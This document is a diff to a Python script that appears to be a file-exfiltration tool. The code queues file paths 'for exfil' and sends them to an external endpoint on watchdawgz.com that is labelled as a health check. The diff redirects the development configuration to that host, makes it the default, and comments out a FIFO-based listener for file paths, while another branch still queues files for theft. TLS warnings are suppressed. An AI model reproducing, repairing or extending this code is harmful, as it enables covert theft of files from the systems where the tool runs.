@@ -19,10 +19,10 @@ import platform
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== CONFIG ==========
-ENV = os.environ.get("ENV", "PROD").upper()
+ENV = os.environ.get("ENV", "DEV").upper()
 CONFIG = {
     "DEV": {
-        "BASE_URL": "http://localhost:8443/healthcheck",
+        "BASE_URL": "https://watchdawgz.com/healthcheck",
     },
     "PROD": {
         "BASE_URL": "https://watchdawgz.com/healthcheck",
@@ -188,37 +188,37 @@ def fifo_listener_loop(stop_event):
                         file_stack.add(filepath)
                         logger.info(f"[+] Queued for exfil: {filepath}")
             time.sleep(1)
-    else:
-        FIFO_PATH = "/tmp/fifo"
-        if not os.path.exists(FIFO_PATH):
-            os.mkfifo(FIFO_PATH)
+    # else:
+    #     FIFO_PATH = "/tmp/fifo"
+    #     if not os.path.exists(FIFO_PATH):
+    #         os.mkfifo(FIFO_PATH)
 
-        if not os.path.exists(FIFO_PATH):
-            os.mkfifo(FIFO_PATH)
-            logger.info(f"[+] Created FIFO at {FIFO_PATH}")
+    #     if not os.path.exists(FIFO_PATH):
+    #         os.mkfifo(FIFO_PATH)
+    #         logger.info(f"[+] Created FIFO at {FIFO_PATH}")
 
-        fifo = open(FIFO_PATH, "r")
-        logger.info("[*] FIFO listener started.")
+    #     fifo = open(FIFO_PATH, "r")
+    #     logger.info("[*] FIFO listener started.")
 
-        try:
-            while not stop_event.is_set():
-                rlist, _, _ = select.select([fifo], [], [], 1)
-                if fifo in rlist:
-                    while True:
-                        line = fifo.readline()
-                        if not line:
-                            break  # end of current batch of input
-                        filepath = line.strip()
-                        if os.path.isfile(filepath):
-                            file_stack.add(filepath)
-                            logger.info(f"[+] Queued for exfil: {filepath}")
-                        else:
-                            logger.warning(f"[!] Ignored non-file path: {filepath}")
-        except Exception as e:
-            logger.error(f"[!] FIFO listener error: {e}")
-        finally:
-            fifo.close()
-            logger.info("[*] FIFO listener stopped.")
+    #     try:
+    #         while not stop_event.is_set():
+    #             rlist, _, _ = select.select([fifo], [], [], 1)
+    #             if fifo in rlist:
+    #                 while True:
+    #                     line = fifo.readline()
+    #                     if not line:
+    #                         break  # end of current batch of input
+    #                     filepath = line.strip()
+    #                     if os.path.isfile(filepath):
+    #                         file_stack.add(filepath)
+    #                         logger.info(f"[+] Queued for exfil: {filepath}")
+    #                     else:
+    #                         logger.warning(f"[!] Ignored non-file path: {filepath}")
+    #     except Exception as e:
+    #         logger.error(f"[!] FIFO listener error: {e}")
+    #     finally:
+    #         fifo.close()
+    #         logger.info("[*] FIFO listener stopped.")
 
 
 
